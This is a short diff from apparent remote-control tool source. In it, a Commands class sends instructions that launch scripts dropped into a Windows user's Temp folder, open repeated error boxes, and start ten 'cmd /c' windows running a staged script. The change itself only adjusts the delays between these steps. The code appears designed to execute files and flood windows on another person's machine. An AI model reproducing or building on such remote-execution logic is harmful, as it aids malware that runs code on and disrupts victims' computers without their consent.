@@ -431,12 +431,12 @@ class Commands:
                 cmdname = receiveMessage()
                 # opens all the scrips
                 sendMessage(f"c n C:/Users/{username}/AppData/Local/Temp/{name}")
-                sleep(0.1)
-                sendMessage(f"c n C:/Users/{username}/AppData/Local/Temp/{name}")
                 sleep(0.2)
+                sendMessage(f"c n C:/Users/{username}/AppData/Local/Temp/{name}")
+                sleep(0.5)
                 for boxes in range(0, 5):
                     sendMessage(f"c n C:/Users/{username}/AppData/Local/Temp/{errname}")
-                sleep(0.2)
+                sleep(0.5)
                 for cmds in range(0, 10):
                     sendMessage(f"c n start cmd /c C:/Users/{username}/AppData/Local/Temp/{cmdname}")
                     sleep(0.1)
